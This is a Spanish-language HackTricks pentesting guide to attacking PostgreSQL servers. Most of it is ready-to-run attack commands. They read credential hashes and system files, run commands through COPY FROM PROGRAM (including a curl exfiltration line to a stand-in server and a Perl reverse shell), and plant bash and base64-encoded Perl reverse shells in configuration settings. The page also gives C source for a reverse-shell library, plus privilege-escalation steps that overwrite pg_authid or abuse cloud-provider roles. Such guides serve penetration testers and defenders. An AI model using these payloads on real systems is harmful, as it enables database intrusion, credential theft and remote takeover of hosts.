# 5432,5433 - Pentesting Postgresql


{{#include ../banners/hacktricks-training.md}}

## **Información Básica**

**PostgreSQL** se describe como un **sistema de base de datos objeto-relacional** que es **de código abierto**. Este sistema no solo utiliza el lenguaje SQL, sino que también lo mejora con características adicionales. Sus capacidades le permiten manejar una amplia gama de tipos de datos y operaciones, lo que lo convierte en una opción versátil para desarrolladores y organizaciones.

**Puerto por defecto:** 5432, y si este puerto ya está en uso, parece que postgresql utilizará el siguiente puerto (probablemente 5433) que no está en uso.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Conectar y Enumeración Básica
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
> [!WARNING]
> Si al ejecutar **`\list`** encuentras una base de datos llamada **`rdsadmin`**, sabes que estás dentro de una **base de datos postgresql de AWS**.

Para más información sobre **cómo abusar de una base de datos PostgreSQL**, consulta:

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/
{{#endref}}

## Enumeración Automática
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Fuerza bruta**](../generic-hacking/brute-force.md#postgresql)

### **Escaneo de puertos**

Según [**esta investigación**](https://www.exploit-db.com/papers/13084), cuando un intento de conexión falla, `dblink` lanza una excepción `sqlclient_unable_to_establish_sqlconnection` que incluye una explicación del error. Ejemplos de estos detalles se enumeran a continuación.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
- El host está inactivo

`DETAIL: no se pudo conectar al servidor: No hay ruta al host ¿Está el servidor en ejecución en el host "1.2.3.4" y aceptando conexiones TCP/IP en el puerto 5678?`

- El puerto está cerrado
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
- El puerto está abierto
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
o
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
- El puerto está abierto o filtrado
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
En las funciones PL/pgSQL, actualmente no es posible obtener detalles de excepciones. Sin embargo, si tienes acceso directo al servidor PostgreSQL, puedes recuperar la información necesaria. Si extraer nombres de usuario y contraseñas de las tablas del sistema no es factible, puedes considerar utilizar el método de ataque de lista de palabras discutido en la sección anterior, ya que podría potencialmente dar resultados positivos.

## Enumeración de Privilegios

### Roles

| Tipos de Rol   |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | El rol tiene privilegios de superusuario                                                                                                            |
| rolinherit     | El rol hereda automáticamente los privilegios de los roles de los que es miembro                                                                      |
| rolcreaterole  | El rol puede crear más roles                                                                                                                         |
| rolcreatedb    | El rol puede crear bases de datos                                                                                                                    |
| rolcanlogin    | El rol puede iniciar sesión. Es decir, este rol puede ser dado como el identificador de autorización de sesión inicial                                |
| rolreplication | El rol es un rol de replicación. Un rol de replicación puede iniciar conexiones de replicación y crear y eliminar slots de replicación.               |
| rolconnlimit   | Para roles que pueden iniciar sesión, esto establece el número máximo de conexiones concurrentes que este rol puede hacer. -1 significa sin límite.   |
| rolpassword    | No es la contraseña (siempre se lee como `********`)                                                                                                  |
| rolvaliduntil  | Tiempo de expiración de la contraseña (solo se usa para autenticación de contraseña); nulo si no hay expiración                                        |
| rolbypassrls   | El rol elude cada política de seguridad a nivel de fila, consulta [Sección 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) para más información. |
| rolconfig      | Valores predeterminados específicos del rol para variables de configuración en tiempo de ejecución                                                      |
| oid            | ID del rol                                                                                                                                           |

#### Grupos Interesantes

- Si eres miembro de **`pg_execute_server_program`** puedes **ejecutar** programas
- Si eres miembro de **`pg_read_server_files`** puedes **leer** archivos
- Si eres miembro de **`pg_write_server_files`** puedes **escribir** archivos

> [!NOTE]
> Ten en cuenta que en Postgres un **usuario**, un **grupo** y un **rol** son lo **mismo**. Solo depende de **cómo lo uses** y si **permites que inicie sesión**.
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tablas
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Funciones
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Acciones del sistema de archivos

### Leer directorios y archivos

Desde este [**commit** ](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) los miembros del grupo definido **`DEFAULT_ROLE_READ_SERVER_FILES`** (llamado **`pg_read_server_files`**) y **super usuarios** pueden usar el método **`COPY`** en cualquier ruta (revisa `convert_and_check_filename` en `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
> [!WARNING]
> Recuerda que si no eres superusuario pero tienes los permisos de **CREATEROLE** puedes **hacerte miembro de ese grupo:**
>
> ```sql
> GRANT pg_read_server_files TO username;
> ```
>
> [**Más información.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Hay **otras funciones de postgres** que se pueden usar para **leer archivos o listar un directorio**. Solo **superusuarios** y **usuarios con permisos explícitos** pueden usarlas:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Puedes encontrar **más funciones** en [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Escritura de Archivos Simple

Solo **super usuarios** y miembros de **`pg_write_server_files`** pueden usar copy para escribir archivos.
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
> [!WARNING]
> Recuerda que si no eres superusuario pero tienes los permisos **`CREATEROLE`** puedes **hacerte miembro de ese grupo:**
>
> ```sql
> GRANT pg_write_server_files TO username;
> ```
>
> [**Más información.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Recuerda que COPY no puede manejar caracteres de nueva línea, por lo tanto, incluso si estás usando una carga útil en base64 **necesitas enviar una línea única**.\
Una limitación muy importante de esta técnica es que **`copy` no se puede usar para escribir archivos binarios ya que modifica algunos valores binarios.**

### **Carga de archivos binarios**

Sin embargo, hay **otras técnicas para cargar grandes archivos binarios:**

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md
{{#endref}}



### Actualización de datos de tabla PostgreSQL a través de escritura en archivo local

Si tienes los permisos necesarios para leer y escribir archivos del servidor PostgreSQL, puedes actualizar cualquier tabla en el servidor **sobrescribiendo el nodo de archivo asociado** en [el directorio de datos de PostgreSQL](https://www.postgresql.org/docs/8.1/storage.html). **Más sobre esta técnica** [**aquí**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Pasos requeridos:

1.  Obtén el directorio de datos de PostgreSQL

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Nota:** Si no puedes recuperar la ruta del directorio de datos actual de la configuración, puedes consultar la versión principal de PostgreSQL a través de la consulta `SELECT version()` e intentar forzar la ruta. Las rutas comunes del directorio de datos en instalaciones de PostgreSQL en Unix son `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`. Un nombre de clúster común es `main`.

2.  Obtén una ruta relativa al filenode, asociado con la tabla objetivo

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

Esta consulta debería devolver algo como `base/3/1337`. La ruta completa en el disco será `$DATA_DIRECTORY/base/3/1337`, es decir, `/var/lib/postgresql/13/main/base/3/1337`.

3.  Descarga el filenode a través de las funciones `lo_*`

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```

4.  Obtén el tipo de dato, asociado con la tabla objetivo

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```

5.  Usa el [Editor de Filenode de PostgreSQL](https://github.com/adeadfed/postgresql-filenode-editor) para [editar el filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); establece todos los flags booleanos `rol*` a 1 para permisos completos.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![Demostración del Editor de Filenode de PostgreSQL](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)

6.  Vuelve a cargar el filenode editado a través de las funciones `lo_*`, y sobrescribe el archivo original en el disco

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```

7.  _(Opcional)_ Limpia la caché de la tabla en memoria ejecutando una consulta SQL costosa

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

8.  Ahora deberías ver los valores de la tabla actualizados en PostgreSQL.

También puedes convertirte en superadministrador editando la tabla `pg_authid`. **Consulta** [**la siguiente sección**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE para programa**

Desde [la versión 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), solo **superusuarios** y miembros del grupo **`pg_execute_server_program`** pueden usar copy para RCE (ejemplo con exfiltración:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Ejemplo para ejecutar:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
> [!WARNING]
> Recuerda que si no eres superusuario pero tienes los permisos **`CREATEROLE`** puedes **hacerte miembro de ese grupo:**
>
> ```sql
> GRANT pg_execute_server_program TO username;
> ```
>
> [**Más información.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

O utiliza el módulo `multi/postgres/postgres_copy_from_program_cmd_exec` de **metasploit**.\
Más información sobre esta vulnerabilidad [**aquí**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Aunque se reportó como CVE-2019-9193, Postgres declaró que esto era una [característica y no será corregido](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

### RCE con lenguajes de PostgreSQL

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md
{{#endref}}

### RCE con extensiones de PostgreSQL

Una vez que hayas **aprendido** del post anterior **cómo subir archivos binarios**, podrías intentar obtener **RCE subiendo una extensión de postgresql y cargándola**.

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md
{{#endref}}

### RCE con el archivo de configuración de PostgreSQL

> [!NOTE]
> Los siguientes vectores de RCE son especialmente útiles en contextos de SQLi restringidos, ya que todos los pasos se pueden realizar a través de declaraciones SELECT anidadas.

El **archivo de configuración** de PostgreSQL es **escribible** por el **usuario postgres**, que es quien ejecuta la base de datos, así que como **superusuario**, puedes escribir archivos en el sistema de archivos, y por lo tanto puedes **sobrescribir este archivo.**

![](<../images/image (322).png>)

#### **RCE con ssl_passphrase_command**

Más información [sobre esta técnica aquí](https://pulsesecurity.co.nz/articles/postgres-sqli).

El archivo de configuración tiene algunos atributos interesantes que pueden llevar a RCE:

- `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Ruta a la clave privada de la base de datos
- `ssl_passphrase_command = ''` Si el archivo privado está protegido por contraseña (encriptado), postgresql **ejecutará el comando indicado en este atributo**.
- `ssl_passphrase_command_supports_reload = off` **Si** este atributo está **activado**, el **comando** ejecutado si la clave está protegida por contraseña **se ejecutará** cuando `pg_reload_conf()` sea **ejecutado**.

Entonces, un atacante necesitará:

1. **Volcar la clave privada** del servidor
2. **Encriptar** la clave privada descargada:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Sobrescribir**
4. **Volcar** la **configuración** actual de postgresql
5. **Sobrescribir** la **configuración** con los atributos mencionados:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Ejecutar `pg_reload_conf()`

Mientras probaba esto, noté que solo funcionará si el **archivo de clave privada tiene privilegios 640**, es **propiedad de root** y del **grupo ssl-cert o postgres** (para que el usuario postgres pueda leerlo), y está ubicado en _/var/lib/postgresql/12/main_.

#### **RCE con archive_command**

**Más** [**información sobre esta configuración y sobre WAL aquí**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Otro atributo en el archivo de configuración que es explotable es `archive_command`.

Para que esto funcione, la configuración `archive_mode` debe estar `'on'` o `'always'`. Si eso es cierto, entonces podríamos sobrescribir el comando en `archive_command` y forzarlo a ejecutarse a través de las operaciones WAL (write-ahead logging).

Los pasos generales son:

1. Verificar si el modo de archivo está habilitado: `SELECT current_setting('archive_mode')`
2. Sobrescribir `archive_command` con la carga útil. Por ejemplo, un shell inverso: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Recargar la configuración: `SELECT pg_reload_conf()`
4. Forzar la operación WAL para que se ejecute, lo que llamará al comando de archivo: `SELECT pg_switch_wal()` o `SELECT pg_switch_xlog()` para algunas versiones de Postgres

#### **RCE con bibliotecas de precarga**

Más información [sobre esta técnica aquí](https://adeadfed.com/posts/postgresql-select-only-rce/).

Este vector de ataque aprovecha las siguientes variables de configuración:

- `session_preload_libraries` -- bibliotecas que serán cargadas por el servidor PostgreSQL en la conexión del cliente.
- `dynamic_library_path` -- lista de directorios donde el servidor PostgreSQL buscará las bibliotecas.

Podemos establecer el valor de `dynamic_library_path` a un directorio, escribible por el usuario `postgres` que ejecuta la base de datos, por ejemplo, el directorio `/tmp/`, y subir un objeto `.so` malicioso allí. A continuación, forzaremos al servidor PostgreSQL a cargar nuestra biblioteca recién subida incluyéndola en la variable `session_preload_libraries`.

Los pasos del ataque son:

1. Descargar el `postgresql.conf` original
2. Incluir el directorio `/tmp/` en el valor de `dynamic_library_path`, por ejemplo, `dynamic_library_path = '/tmp:$libdir'`
3. Incluir el nombre de la biblioteca maliciosa en el valor de `session_preload_libraries`, por ejemplo, `session_preload_libraries = 'payload.so'`
4. Verificar la versión principal de PostgreSQL a través de la consulta `SELECT version()`
5. Compilar el código de la biblioteca maliciosa con el paquete de desarrollo correcto de PostgreSQL. Código de ejemplo:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
código tomado de https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Compilando el código:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```

6. Subir el `postgresql.conf` malicioso, creado en los pasos 2-3, y sobrescribir el original
7. Subir el `payload.so` del paso 5 al directorio `/tmp`
8. Recargar la configuración del servidor reiniciando el servidor o invocando la consulta `SELECT pg_reload_conf()`
9. En la próxima conexión a la base de datos, recibirás la conexión de shell inverso.

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

De acuerdo con la [**documentación**](https://www.postgresql.org/docs/13/sql-grant.html): _Los roles que tienen el privilegio **`CREATEROLE`** pueden **otorgar o revocar la membresía en cualquier rol** que **no** sea un **superusuario**._

Así que, si tienes el permiso **`CREATEROLE`**, podrías otorgarte acceso a otros **roles** (que no son superusuario) que pueden darte la opción de leer y escribir archivos y ejecutar comandos:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Modificar Contraseña

Los usuarios con este rol también pueden **cambiar** las **contraseñas** de otros **no superusuarios**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc a SUPERUSER

Es bastante común encontrar que **los usuarios locales pueden iniciar sesión en PostgreSQL sin proporcionar ninguna contraseña**. Por lo tanto, una vez que hayas reunido **permisos para ejecutar código**, puedes abusar de estos permisos para otorgarte el rol de **`SUPERUSER`**:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
> [!NOTE]
> Esto suele ser posible debido a las siguientes líneas en el archivo **`pg_hba.conf`**:
>
> ```bash
> # "local" es solo para conexiones de socket de dominio Unix
> local   all             all                                     trust
> # Conexiones locales IPv4:
> host    all             all             127.0.0.1/32            trust
> # Conexiones locales IPv6:
> host    all             all             ::1/128                 trust
> ```

### **ALTER TABLE privesc**

En [**este informe**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) se explica cómo fue posible el **privesc** en Postgres GCP abusando del privilegio ALTER TABLE que se otorgó al usuario.

Cuando intentas **hacer que otro usuario sea propietario de una tabla**, deberías recibir un **error** que lo impida, pero aparentemente GCP le dio esa **opción al usuario postgres que no es superusuario** en GCP:

<figure><img src="../images/image (537).png" alt=""><figcaption></figcaption></figure>

Uniendo esta idea con el hecho de que cuando se ejecutan los comandos **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) en una **tabla con una función de índice**, la **función** es **llamada** como parte del comando con los **permisos** del **propietario de la tabla**. Es posible crear un índice con una función y dar permisos de propietario a un **superusuario** sobre esa tabla, y luego ejecutar ANALYZE sobre la tabla con la función maliciosa que podrá ejecutar comandos porque está utilizando los privilegios del propietario.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Explotación

1. Comience creando una nueva tabla.
2. Inserte contenido irrelevante en la tabla para proporcionar datos para la función de índice.
3. Desarrolle una función de índice maliciosa que contenga una carga útil de ejecución de código, permitiendo que se ejecuten comandos no autorizados.
4. ALTERE el propietario de la tabla a "cloudsqladmin", que es el rol de superusuario de GCP utilizado exclusivamente por Cloud SQL para gestionar y mantener la base de datos.
5. Realice una operación ANALYZE en la tabla. Esta acción obliga al motor de PostgreSQL a cambiar al contexto de usuario del propietario de la tabla, "cloudsqladmin". En consecuencia, la función de índice maliciosa se llama con los permisos de "cloudsqladmin", lo que permite la ejecución del comando de shell previamente no autorizado.

En PostgreSQL, este flujo se ve algo así:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Luego, la tabla `shell_commands_results` contendrá la salida del código ejecutado:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Inicio de sesión local

Algunas instancias de postgresql mal configuradas pueden permitir el inicio de sesión de cualquier usuario local, es posible iniciar sesión desde 127.0.0.1 utilizando la **`dblink` function**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
> [!WARNING]
> Tenga en cuenta que para que la consulta anterior funcione **la función `dblink` necesita existir**. Si no existe, puede intentar crearla con
>
> ```sql
> CREATE EXTENSION dblink;
> ```

Si tiene la contraseña de un usuario con más privilegios, pero el usuario no tiene permitido iniciar sesión desde una IP externa, puede usar la siguiente función para ejecutar consultas como ese usuario:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Es posible verificar si esta función existe con:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Función definida por el usuario con** SECURITY DEFINER

[**En este informe**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), los pentesters pudieron escalar privilegios dentro de una instancia de postgres proporcionada por IBM, porque **encontraron esta función con la bandera SECURITY DEFINER**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

Como [**se explica en la documentación**](https://www.postgresql.org/docs/current/sql-createfunction.html), una función con **SECURITY DEFINER se ejecuta** con los privilegios del **usuario que la posee**. Por lo tanto, si la función es **vulnerable a inyección SQL** o está realizando algunas **acciones privilegiadas con parámetros controlados por el atacante**, podría ser abusada para **escalar privilegios dentro de postgres**.

En la línea 4 del código anterior se puede ver que la función tiene la bandera **SECURITY DEFINER**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
Y luego **ejecutar comandos**:

<figure><img src="../images/image (649).png" alt=""><figcaption></figcaption></figure>

### Fuerza Bruta con PL/pgSQL

**PL/pgSQL** es un **lenguaje de programación completamente funcional** que ofrece un mayor control procedural en comparación con SQL. Permite el uso de **bucles** y otras **estructuras de control** para mejorar la lógica del programa. Además, las **sentencias SQL** y los **triggers** tienen la capacidad de invocar funciones que se crean utilizando el **lenguaje PL/pgSQL**. Esta integración permite un enfoque más completo y versátil para la programación y automatización de bases de datos.\
**Puedes abusar de este lenguaje para pedirle a PostgreSQL que realice fuerza bruta en las credenciales de los usuarios.**

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md
{{#endref}}

### Privesc al Sobrescribir Tablas Internas de PostgreSQL

> [!NOTE]
> El siguiente vector de privesc es especialmente útil en contextos de SQLi restringidos, ya que todos los pasos se pueden realizar a través de sentencias SELECT anidadas.

Si puedes **leer y escribir archivos del servidor PostgreSQL**, puedes **convertirte en superusuario** al sobrescribir el filenode en disco de PostgreSQL, asociado con la tabla interna `pg_authid`.

Lee más sobre **esta técnica** [**aquí**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

Los pasos del ataque son:

1. Obtener el directorio de datos de PostgreSQL
2. Obtener una ruta relativa al filenode, asociado con la tabla `pg_authid`
3. Descargar el filenode a través de las funciones `lo_*`
4. Obtener el tipo de dato, asociado con la tabla `pg_authid`
5. Usar el [Editor de Filenode de PostgreSQL](https://github.com/adeadfed/postgresql-filenode-editor) para [editar el filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table); establecer todos los flags booleanos `rol*` a 1 para permisos completos.
6. Volver a subir el filenode editado a través de las funciones `lo_*`, y sobrescribir el archivo original en el disco
7. _(Opcional)_ Limpiar la caché de la tabla en memoria ejecutando una consulta SQL costosa
8. Ahora deberías tener los privilegios de un superadmin completo.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### logging

Dentro del archivo _**postgresql.conf**_ puedes habilitar los registros de postgresql cambiando:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Luego, **reinicia el servicio**.

### pgadmin

[pgadmin](https://www.pgadmin.org) es una plataforma de administración y desarrollo para PostgreSQL.\
Puedes encontrar **contraseñas** dentro del archivo _**pgadmin4.db**_\
Puedes desencriptarlas usando la función _**decrypt**_ dentro del script: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
